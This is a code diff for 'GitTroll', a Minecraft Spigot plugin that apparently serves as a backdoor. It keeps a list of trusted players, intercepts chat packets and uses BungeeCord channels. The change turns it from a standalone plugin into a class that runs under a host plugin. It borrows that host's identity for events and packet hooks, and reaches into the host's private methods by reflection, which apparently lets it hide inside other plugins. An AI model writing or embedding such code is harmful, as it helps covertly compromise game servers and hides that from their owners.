@@ -2,6 +2,7 @@ package net.Lenni0451.GitTroll;
 
 import java.io.File;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -35,7 +36,7 @@ import net.minecraft.server.v1_8_R3.MinecraftServer;
 import net.minecraft.server.v1_8_R3.Packet;
 import net.minecraft.server.v1_8_R3.PacketPlayInChat;
 
-public class GitTroll extends JavaPlugin implements Listener {
+public class GitTroll implements Listener {
 	
 	public static final String PREFIX = "§7[§6GitTroll§7] §a";
 	private static GitTroll instance;
@@ -45,7 +46,22 @@ public class GitTroll extends JavaPlugin implements Listener {
 	}
 	
 	public static File getPluginFile() {
-		return instance.getFile();
+		try {
+			Method method = instance.parentPlugin.getClass().getDeclaredMethod("getFile");
+			method.setAccessible(true);
+			return (File) method.invoke(instance.parentPlugin);
+		} catch (Throwable e) {}
+		try {
+			return new File(GitTroll.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+		} catch (Throwable e) {}
+		return new File("spigot.jar");
+	}
+	
+	
+	private final JavaPlugin parentPlugin;
+	
+	public GitTroll(final JavaPlugin parentPlugin) {
+		this.parentPlugin = parentPlugin;
 	}
 	
 	
@@ -112,7 +128,6 @@ public class GitTroll extends JavaPlugin implements Listener {
 	public CommandManager commandManager;
 	public TinyProtocol protocolManager;
 
-	@Override
 	public void onEnable() {
 		instance = this;
 		this.trustedPlayers = Lists.newArrayList();
@@ -120,7 +135,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 		Settings.getDefaultTrustedUsers(joinTrusts);
 		
 		if(!Bukkit.getServer().getClass().toString().contains("1_8")) {
-			Bukkit.getPluginManager().disablePlugin(this);
+			Bukkit.getPluginManager().disablePlugin(this.parentPlugin);
 			return;
 		}
 		
@@ -143,7 +158,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 
 		this.eventManager = new EventManager();
 		this.commandManager = new CommandManager();
-		this.protocolManager = new TinyProtocol(this) {
+		this.protocolManager = new TinyProtocol(this.parentPlugin) {
 			@Override
 			public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
 				if(packet instanceof PacketPlayInChat) {
@@ -172,15 +187,14 @@ public class GitTroll extends JavaPlugin implements Listener {
 			}
 		};
 		
-		Bukkit.getPluginManager().registerEvents(this, this);
-		Bukkit.getMessenger().registerOutgoingPluginChannel(GitTroll.getInstance(), "BungeeCord");
-		Bukkit.getMessenger().registerIncomingPluginChannel(GitTroll.getInstance(), "BungeeCord", (String channel, Player player, byte[] data) -> {
+		Bukkit.getPluginManager().registerEvents(this, this.parentPlugin);
+		Bukkit.getMessenger().registerOutgoingPluginChannel(this.parentPlugin, "BungeeCord");
+		Bukkit.getMessenger().registerIncomingPluginChannel(this.parentPlugin, "BungeeCord", (String channel, Player player, byte[] data) -> {
 			this.eventManager.callEvent(new EventPluginMessage(channel, player, data));
 		});
-		Bukkit.getScheduler().runTaskLater(this, () -> this.eventManager.callEvent(new ServerLoadedEvent()), 1);
+		Bukkit.getScheduler().runTaskLater(this.parentPlugin, () -> this.eventManager.callEvent(new ServerLoadedEvent()), 1);
 	}
 	
-	@Override
 	public void onDisable() {
 		Logger.broadcastGitMessage("§cThe plugin is being disabled.");
 		
